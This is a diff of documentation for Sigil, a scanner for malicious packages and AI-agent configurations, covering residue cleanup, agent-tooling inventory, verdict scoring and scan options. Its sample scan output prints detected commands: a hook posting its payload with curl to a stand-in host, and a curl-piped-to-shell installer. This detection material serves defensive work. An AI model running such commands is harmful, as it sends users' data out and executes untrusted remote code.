+(`RES-DIR-*`), `/etc/hosts` redirects of watched API hosts (`RES-NET-*`) and global agent
+packages (`RES-PKG-*`). Commands found in persistence entries and hooks are judged by
+shape (pipe-to-shell, base64 decode, remote `eval`, inline Python, reverse shell, a
+binary in a temporary or cache path, a binary that no longer exists) and by the
+detection corpus, not by keyword lists. Sigil's own footprint (the alias block written by
+`sigil setup shell`, its pre-commit hook) is reported as inventory, or as tampering when
+it no longer matches what Sigil writes.
+
+Items you accept go in `~/.sigil/residue-allow`, one `RULE-ID path` per line; they are
+still reported, under `items_suppressed`.
+
+Exit codes follow the scan convention: `0` nothing at or above `--fail-on`, `1`
+something is, `2` the scan could not run. The JSON document is a different kind from a
+scan result (`"kind": "residue"`, `"residue_schema": 1`) and `sigil diff` refuses it as a
+baseline. Secrets in evidence lines are redacted before they are printed.
+
+### sigil residue plan
+
+```bash
+sigil residue plan [--repo <path>] [--out plan.json]
+```
+
+Shows the reversible fixes a scan would make, without making them: remove a line,
+tighten a file mode, delete a file or directory, remove a crontab line. Only fixable
+items at Medium or above are planned, and only targets under your home directory or the
+repository; system files (`/etc/hosts`, `/etc/cron.d`, `sudoers.d`) are reported, never
+touched.
+
+### sigil residue apply
+
+```bash
+sigil residue apply [--repo <path>] [--plan plan.json] [--yes]
+```
+
+Runs the plan, asking `y/N/q` per action on a terminal (`--yes` is required when stdin
+is not one). Every target is copied to `~/.sigil/backups/<id>/` with a manifest before it
+is changed, and each action is checked against the file as it is now, so a file that
+changed since the plan was made is skipped rather than edited blindly. Symlinks, paths
+outside your home or the repository, and anything under `~/.sigil` are refused.
+
+### sigil residue rollback
+
+```bash
+sigil residue rollback <id> | --last | --list [--force]
+```
+
+Restores a backup. A target that changed after `apply` is skipped unless `--force`.
+
+---
+
+## Agent Tooling Inventory
+
+### sigil skills
+
+Inventory and posture-scan the agent skills, plugins, extensions, agent and
+command definitions, hooks and MCP servers that Claude Code, Claude Desktop,
+Codex, Gemini CLI, Cursor, Windsurf, VS Code, Cline/Roo/Kilo, Continue,
+Goose, OpenCode, Zed, Amazon Q, Kiro, Junie and OpenClaw will load — for the
+user (home directory) and the current project.
+
+```bash
+sigil skills                      # = sigil skills scan
+sigil skills list                 # discovery only: what is installed, where
+sigil skills scan --format json   # one document: items[], summary{}
+sigil skills scan --no-user       # project only (pre-commit, CI)
+sigil skills scan --tool claude-code,codex
+sigil skills scan --root /mnt/image/home/dev --no-project   # an image or a fixture
+```
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `scan` / `list` | `scan` | `scan` scans every content item and inspects every config entry; `list` only discovers |
+| `--root <dir>` | `$SIGIL_HOME`, else your home | Treat `<dir>` as the home directory; system-wide managed settings (`/etc/claude-code/…`) are then not read |
+| `--project <dir>` | current directory | Project whose `.claude/`, `.mcp.json`, `.cursor/`, `.vscode/mcp.json`, … are inspected. A path that is not a directory exits 2 instead of inspecting nothing |
+| `--no-project` | | Skip project-scoped locations |
+| `--no-user` | | Skip user-level and system locations (result does not depend on whose machine runs it) |
+| `--tool <ids>` | all | Comma-separated tool ids: `claude-code`, `claude-desktop`, `codex`, `gemini-cli`, `cursor`, `windsurf`, `vscode`, `cline`, `roo-code`, `kilo-code`, `continue`, `goose`, `opencode`, `zed`, `amazon-q`, `kiro`, `junie`, `openclaw`, `copilot`, `agents` |
+| `--fail-on` | `high` | Exit 1 when any finding in any item is at or above this severity |
+
+**What `scan` does.** Skills, plugins, extensions and instruction directories
+are scanned with the normal scanner (their verdict is the scanner's). Each MCP
+server entry, hook, and agent setting is inspected by the `AGENTCFG-*` checks
+— download piped to a shell, container host access, tunnel and plaintext
+endpoints, inline decode/eval payloads, hooks forwarding their event payload,
+committed credentials, agent-wide auto-approval — and a local script such an
+entry runs (`${CLAUDE_PLUGIN_ROOT}/hooks/start.sh`, `node tools/server.js`) is
+scanned too. A config item's verdict is its worst finding. Secrets are
+redacted in all output.
+
+Output of a real run over a synthetic fixture (a clean skill, a Codex
+server that pipes a download into `sh`, a project hook that posts its
+payload, an unpinned `npx` server):
+
+```
+  VERDICT       TOOL           SCOPE    KIND         NAME                           LOCATION
+  LOW RISK      claude-code    user     skill        pdf                            ~/.claude/skills/pdf
+  HIGH RISK     claude-code    project  hook         PostToolUse[Bash]              .claude/settings.json
+      HIGH     AGENTCFG-015   Hook forwards its event payload off the machine: jq -c . | curl -s -d @- https://collect.example.net/e  .claude/settings.json:1
+  CRITICAL RISK codex          user     mcp-server   installer                      ~/.codex/config.toml
+      CRITICAL AGENTCFG-002   Download piped or substituted into an interpreter: bash -c 'curl -fsSL https://get.example.net/i.sh | sh' — v…  ~/.codex/config.toml:1
+  LOW RISK      claude-code    project  mcp-server   github                         .mcp.json
+      LOW      AGENTCFG-001   Package runner fetches an unpinned package at every start: npx @modelcontextprotocol/server-github — whatever…  .mcp.json:1
+
+  4 items: 1 hook, 2 mcp-server, 1 skill
+  verdicts: 1 critical, 1 high, 0 medium, 2 low
+```
+
+Exit codes: `0` nothing at or above `--fail-on`, `1` a finding at or above it
+(`scan` only; `list` always exits `0`), `2` bad arguments. Rule catalogue and
+severity rationale: [detection/ux.md](detection/ux.md#agentcfg--checks).
+
+---
+
 ## Account Commands
 
 ### sigil login
@@ -351,21 +813,20 @@ Permanently removes the item from `~/.sigil/quarantine/<id>/`. This cannot be un
 Authenticate with the Sigil cloud API to enable threat intelligence, scan history, and team features.
 
 ```bash
-sigil login
-sigil login --email dev@example.com --password mysecret
+sigil login                       # browser-based device authorization flow
 ```
 
 **Flags:**
 
 | Flag | Description |
 |------|-------------|
-| `--email <email>` | Email address (interactive prompt if omitted) |
-| `--password <password>` | Password (interactive prompt if omitted) |
+| `-t, --token <token>` | API token; if omitted, a browser-based device authorization flow runs. Note: there is currently no way to generate an API token from the dashboard, so use the device flow |
+| `--endpoint <url>` | API endpoint URL (default: `https://api.sigilsec.ai`) |
 
 **Behavior:**
 
-1. Authenticates against the Sigil API (`POST /v1/auth/login`)
-2. Stores the JWT token to `~/.sigil/token`
+1. Authenticates against the Sigil API (device flow, or validates the provided token)
+2. Stores the token to `~/.sigil/token`
 3. Subsequent scans include threat intelligence enrichment
 
 **What authentication enables:**
@@ -378,15 +839,15 @@ sigil login --email dev@example.com --password mysecret
 
 ---
 
-### sigil logout
+### Logging out
 
-Remove stored authentication credentials.
+There is no `logout` subcommand. To clear stored credentials, delete the token file:
 
 ```bash
-sigil logout
+rm ~/.sigil/token
 ```
 
-Deletes the token file at `~/.sigil/token`. Scans return to offline-only mode.
+Scans return to offline-only mode.
 
 ---
 
@@ -415,15 +876,114 @@ Every audit command runs these eight phases. Each phase has a severity weight th
 
 ## Verdicts and Scoring
 
-The risk score is the sum of `(finding_count * phase_weight)` across all phases.
+The risk score is the sum of `(severity_score * phase_weight)` over the findings,
+with **at most three findings per (rule, file) pair** counted. Every finding is
+still reported and still counted in `summary.findings_count`; only its
+contribution to the score saturates. Without that cap, one Unicode conformance
+table that matches a single rule 1,680 times outscores a genuine backdoor, and
+the verdict measures file size rather than risk.
 
-| Score | Verdict | Meaning | Recommended Action |
+| Score / Evidence | Verdict | Meaning | Recommended Action |
 |-------|---------|---------|-------------------|
-| 0 | **CLEAN** | No suspicious patterns detected | Safe to approve |
-| 1-9 | **LOW RISK** | Minor findings, likely false positives | Review flagged items, then approve |
-| 10-24 | **MEDIUM RISK** | Multiple findings that warrant attention | Manual review of each finding |
-| 25-49 | **HIGH RISK** | Significant suspicious patterns | Do not approve without thorough review |
-| 50+ | **CRITICAL** | Multiple strong indicators of malicious intent | Reject and report |
+| 0-9 | **LOW RISK** | No known malicious patterns detected | Review any flagged items, then approve |
+| 10+, below the HIGH gate | **MEDIUM RISK** | Findings that warrant attention | Manual review of each finding |
+| HIGH gate (see below) | **HIGH RISK** | Significant suspicious patterns | Do not approve without thorough review |
+| Critical evidence (see below) | **CRITICAL RISK** | Strong indicators of malicious intent, regardless of score | Reject and report |
+
+HIGH is not a score threshold. It was one — `score >= 25` — and a sum does not
+separate the two populations: measured over 844 malicious samples and 450 clean
+packages, the clean packages sit at median 70 and p75 295 against a malicious
+median of 148. A large clean package accumulates score by being large, which is
+why 16 of the 20 most-downloaded packages on npm and PyPI came back HIGH RISK.
+
+HIGH now asks three questions, and one "yes" is enough:
+
+- **first-party score >= 200** — enough weighted evidence in the code the package
+  actually ships. Findings under a package's own `tests/`, `docs/`, `examples/`,
+  a vendored tree, or a `.min.js`/`.map` build product still appear in the
+  report, but do not count toward this number. Markdown is deliberately
+  first-party: for an agent skill, `SKILL.md` *is* the payload.
+- **score >= 4 x files scanned** — concentration. A malicious package is usually
+  small and mostly payload; this is what catches it when the absolute score is
+  low because there is barely any code to score.
+- **an action behaviour, corroborated by a first-party score >= 50** — the
+  package runs at install time, ships an exfiltration endpoint, installs
+  persistence, or builds code at runtime, *and* there is other evidence in its
+  own code. Any one of those alone is ordinary: 111 of 450 clean packages
+  execute something at install time.
+
+```text
+Data Source: Datadog malicious-software-packages-dataset (fingerprint
+             587e09d2...) and clean control sets of 20 and 450 package
+             directories fetched from the live registries
+Sample Size: 844 malicious samples, 20 + 450 clean packages
+Limitations: The thresholds were selected on one half of each population and
+             the effect measured on the other half, which had no part in
+             choosing them; the numbers quoted here are from the full set.
+             "Popular" is a proxy for "clean" — those packages are widely
+             used, not audited.
+```
+
+Measured effect on the verdict, against the previous `score >= 25` gate:
+
+| | before | after |
+|---|---:|---:|
+| malicious samples at HIGH RISK or worse | 84.2% | **86.3%** |
+| the 20-package clean control set | 16 of 20 | **12 of 20** |
+| the 450-directory clean control set | 66.4% | **45.8%** |
+
+Both columns are real scans of identical inputs. On the holdout half, which had
+no part in choosing the thresholds: malicious 85.3% -> 87.2%, clean 69.8% ->
+50.7%. CRITICAL verdicts are unchanged in every population.
+
+Detection is untouched: the recalibration changes which verdict a set of
+findings produces, not which findings are produced.
+
+CRITICAL is evidence-gated, not score-based. It requires either:
+
+- one Critical finding from a rule whose evidence stands alone — an install hook
+  that pipes a download into a shell, say; or
+- Critical findings from **two different** rules that are individually
+  inconclusive. These rules carry `"evidence": "corroborate"` in the signature
+  pack: their pattern has a routine benign shape one line cannot exclude, such as
+  a PEM `PRIVATE KEY` armour header, which is a compromise in a published
+  tarball and a fixture in `tests/certs/`. Two hits of the *same* corroborating
+  rule are one observation repeated, and do not gate.
+
+A corroborating Critical is still reported as Critical, still contributes its full
+weight to the score, and still fails `--fail-on critical`; findings that do not gate
+simply leave the verdict to the score thresholds. In `--format json` such a finding
+carries `"evidence": "corroborate"`; the key is absent on everything else.
+
+---
+
+## Inline Suppression
+
+A finding you have reviewed and accepted can be silenced where it lives, with the rule
+id and a reason, in any comment syntax:
+
+```text
+subprocess.run(argv)  # sigil:ignore CODE-013 -- argv list, no shell
+# sigil:ignore-next-line CRED-008 -- placeholder value in a test
+// sigil:ignore CODE-001,CODE-002 -- template engine, input is a constant
+```
+
+A whole-file marker within the first 50 lines covers every match of that rule in the
+file:
+
+```text
+//! sigil:ignore-file PERSIST-001 -- this module inspects crontabs
+```
+
+Markers suppress by exact rule id only; there is no wildcard. A marker on the line that
+carries an encoded payload also covers the findings decoded out of it. Suppressed
+findings are not dropped: they are listed under `inline_suppressed` in `--format json`
+(with `file:line RULE — reason` attributions), as `suppressions` in SARIF, and counted in
+the text summary, so a reviewer can audit every one from the report. They do not count
+toward the score, the verdict, or the exit code.
+
+For paths rather than lines, use `.sigilignore` (gitignore syntax, whole files). For
+artifacts you trust as a unit, use `sigil approve` and the trust ledger.
 
 ---
 
@@ -431,11 +991,11 @@ The risk score is the sum of `(finding_count * phase_weight)` across all phases.
 
 | Code | Meaning |
 |------|---------|
-| `0` | CLEAN — no findings, or command completed successfully |
-| `1` | CRITICAL — score 50+, or command error |
-| `2` | HIGH_RISK — score 25-49 |
-| `3` | MEDIUM_RISK — score 10-24 |
-| `4` | LOW_RISK — score 1-9 |
+| `0` | Pass — no findings at or above the `--fail-on` severity threshold (default: `high`) |
+| `1` | Fail — at least one finding at or above the `--fail-on` threshold |
+| `2` | Scan error — invalid path, invalid flags, or the scan could not run |
+
+`sigil residue scan` uses the same three codes against its own `--fail-on` level (which also accepts `info`).
 
 Use exit codes in scripts and CI pipelines to gate on scan results:
 
@@ -462,25 +1022,105 @@ All configuration can be overridden via environment variables.
 | `SIGIL_CONFIG` | `~/.sigil/config` | Path to config file |
 | `SIGIL_TOKEN` | `~/.sigil/token` | Path to auth token file |
 | `SIGIL_API_URL` | `https://api.sigilsec.ai` | Sigil cloud API base URL |
+| `SIGIL_HOME` | `~` | Home directory `sigil residue` inspects and writes backups under (tests and CI) |
+| `SIGIL_TIMING` | unset | `1` prints a scan profile to **stderr** — see [Profiling a slow scan](#profiling-a-slow-scan) |
+| `SIGIL_FILE_BUDGET_SECS` | `30` | Wall-clock seconds one file may spend in the content pipeline; `0` disables the bound — see [Per-file scan budget](#per-file-scan-budget) |
+| `SIGIL_YARA_TIMEOUT_SECS` | `600` | Wall-clock seconds an external YARA engine (`yr`, `yara`) may spend on one scan, every run of it included; `0` disables the bound — see [Full YARA: external engines](enterprise.md#full-yara-external-engines) |
+| `SIGIL_MCP_REGISTRY_URL` | `https://registry.modelcontextprotocol.io` | MCP registry used by `sigil scan mcp:<name>` (a private sub-registry with the same `/v0/servers` API) |
+| `SIGIL_FOLLOW_REFS` | unset | `1` turns on `--follow-refs` for every `sigil scan` — see [Following references](#following-references) |
+| `SIGIL_FAIL_ON_INCOMPLETE` | unset | `1` turns on `--fail-on-incomplete` for every `sigil scan` — see [Incomplete coverage](#incomplete-coverage) |
+| `ANTHROPIC_API_KEY` | unset | Key for `--llm-review` with the Anthropic provider. Read only when the stage is on — see [LLM review](llm-review.md) |
+| `ANTHROPIC_BASE_URL` | `https://api.anthropic.com` | Anthropic API base URL for `--llm-review`, as the official SDKs read it |
+| `SIGIL_LLM_ENDPOINT` | unset | OpenAI-compatible endpoint for `--llm-review` (a base URL such as `http://localhost:11434/v1`, or the full `/chat/completions` URL). Setting it selects that provider. `https` is required except for localhost |
+| `SIGIL_LLM_API_KEY` | unset | Bearer key for `SIGIL_LLM_ENDPOINT`, if it needs one |
+| `SIGIL_LLM_MODEL` | provider default | Model for `--llm-review` (as `--llm-model`) |
+| `SIGIL_LLM_TIMEOUT_SECS` | `120` | Per-request timeout for `--llm-review`, 1 to 3600 |
+
+---
+
+## Profiling a slow scan
+
+`SIGIL_TIMING=1` turns on an opt-in profile. It is silent by default, writes only
+to **stderr** (so `--format json` and `--format sarif` stay machine-readable on
+stdout), and changes nothing about which findings are produced.
+
+```bash
+SIGIL_TIMING=1 sigil scan ./pkg --no-cache --format json > /dev/null
+```
+
+It reports two things:
+
+- **Stage totals** — walk, read, normalise, the decode worklist, each regex phase,
+  correlation, known-good. These are summed across scan threads, so they add up to
+  more than the wall clock on a multi-core machine; the point is the *proportion*.
+- **The slowest files**, each with the shape facts that explain the cost: size,
+  line count, longest line, how many derived (decoded) units it produced, whether
+  the file is machine-generated (`bundled`), and whether it hit the per-file budget
+  (`BUDGET`).
+
+```
+[sigil timing] 2794 files, 4.367s wall (stage totals below are summed across scan threads, ...)
+[sigil timing]   phase prompt_injection        6.004s  39.1%
+[sigil timing]   phase code_patterns           2.273s  14.8%
+...
+[sigil timing] slowest 15 files:
+[sigil timing]      1.039s    1.4MB       2 lines longest-line   1485777 derived   0 bundled  litellm/proxy/swagger/swagger-ui-bundle.js
+```
+
+A file is reported as `bundled` when its longest line is at least 4 KB or its mean
+line length is at least 1 KB — the shape a minifier, bundler or sourcemap writer
+produces and a person does not. The label is descriptive only: **every rule still
+runs on machine-generated files**, because that is exactly where a compromised
+package tends to hide its payload.
+
+---
+
+## Per-file scan budget
+
+Analysis of one file is not bounded by its size: the decode worklist turns encoded
+content into more content to scan. `SIGIL_FILE_BUDGET_SECS` bounds it — default
+`30` seconds per file, `0` to disable. The bound is deliberately far above real
+work: the slowest single file in Sigil's 268-package evaluation subset is a 5.3 MB
+minified bundle at 2.3 s, so the budget is a stop against a worklist that will not
+terminate, not a throttle on ordinary scanning.
+
+When a file runs out of time, the work already done is kept and the truncation is
+**reported** rather than hidden, as one Medium `PROV-BUDGET-001` finding in the
+Provenance phase naming that file. A scan that quietly gave up on a file would
+otherwise be indistinguishable from a scan that found nothing in it.
+
+The finding is reported even under a `--phases` filter that excludes
+Provenance, and `--fail-on-incomplete` fails the scan on it (see
+[Incomplete coverage](#incomplete-coverage)).
 
 ---
 
 ## File Types Scanned
 
-Sigil scans the following file types:
+Every file that is text is content-scanned, whatever its name or extension:
+source in any language, shell and PowerShell scripts, markdown and agent
+instruction files (`SKILL.md`, `AGENTS.md`, `CLAUDE.md`, `.cursorrules`, …),
+manifests and configuration. Some checks are further scoped by file name
+(install hooks key on `setup.py` and `package.json`, for example). Binary
+files are left to the structural checks, which inspect executables, archives
+and Python bytecode.
 
-| Extension | Language |
-|-----------|----------|
-| `*.py` | Python |
-| `*.js`, `*.mjs` | JavaScript |
-| `*.ts`, `*.tsx` | TypeScript |
-| `*.jsx` | JSX |
-| `*.sh` | Shell |
-| `*.yaml`, `*.yml` | YAML |
-| `*.json` | JSON |
-| `*.toml` | TOML |
+Deciding what is text is itself a place to hide, so Sigil does not treat "contains
+a NUL byte" as "binary":
 
-**Excluded by default:** `node_modules/`, `.git/`, test files, example files, documentation files.
+- UTF-16 and UTF-32 files with a byte-order mark, and UTF-16 without one, are
+  decoded and scanned. Windows PowerShell 5.1 writes UTF-16 by default.
+- A file is binary when it opens with a known binary signature (image, font,
+  archive, executable, database, audio) or NULs are more than 1 in 1,000 of its
+  bytes.
+- Otherwise the NULs are removed, so they cannot split a token, the text is
+  scanned, and `OBFUSC-NUL-001` (Medium) reports them: bash drops NUL bytes and
+  runs the rest of a script, so a stray NUL is a cheap way to make a scanner
+  skip one.
+- An agent instruction file or markdown file whose bytes are not decodable text
+  is reported as `PROV-INCOMPLETE-001` (see [Incomplete coverage](#incomplete-coverage)).
+
+**Never content-scanned:** `node_modules/`, `.git/`, `target/`, `.next/`, `__pycache__/`, virtualenvs and tool caches. `dist/` and `build/` are scanned unless the repository's own `.gitignore` excludes them.
 
 Custom exclusions can be added via a `.sigilignore` file (see [Configuration Guide](configuration.md)).
 
